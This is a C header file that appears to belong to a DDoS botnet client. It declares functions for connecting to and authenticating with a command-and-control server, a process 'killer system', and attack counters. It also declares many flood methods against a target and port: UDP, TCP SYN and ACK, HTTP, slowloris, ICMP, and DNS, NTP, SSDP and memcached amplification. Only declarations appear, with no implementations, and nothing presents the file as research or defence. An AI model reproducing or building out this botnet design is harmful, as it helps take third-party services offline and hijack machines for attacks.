#ifndef BOT_H
#define BOT_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <time.h>

// Bot configuration
#define MAX_THREADS 1000
#define MAX_CMD_SIZE 1024
#define RECONNECT_DELAY 30
#define AUTH_TIMEOUT 10

// External variables for killer system
extern int main_pid;
extern int watcher_pid;
extern int attack_ongoing[];
extern int cnc_port;

// Global statistics
extern volatile int running;
extern volatile int attack_active;
extern volatile long long total_attacks;
extern volatile long long total_packets;
extern volatile long long total_bytes;

// Bot functionality
void bot_connect_to_cnc(const char* cnc_ip, int cnc_port);
void* bot_command_listener(void* socket_ptr);
int bot_authenticate(int sockfd);
void bot_signal_handler(int sig);
void print_bot_info(void);

// Attack commands
void execute_attack_command(const char* command);
void show_attack_stats(void);

// UDP Methods
void start_udp_flood(const char* target, int port, int duration, int threads);
void start_udp_raw(const char* target, int port, int duration, int threads);

// TCP Methods  
void start_tcp_syn(const char* target, int port, int duration, int threads);
void start_tcp_ack(const char* target, int port, int duration, int threads);

// HTTP Methods
void start_http_flood(const char* target, int port, int duration, int threads);
void start_slowloris(const char* target, int port, int duration, int threads);

// Amplification Methods
void start_dns_amp(const char* target, int duration, int threads);
void start_ntp_amp(const char* target, int duration, int threads);
void start_ssdp_amp(const char* target, int duration, int threads);
void start_memcached_amp(const char* target, int duration, int threads);

// ICMP Flood
void start_icmp_flood(const char* target, int duration, int threads);

// Network utilities
int resolve_hostname(const char* hostname, char* ip_buffer);
int validate_ip(const char* ip);
int validate_port(int port);
void print_network_info(const char* target, int port);

#endif
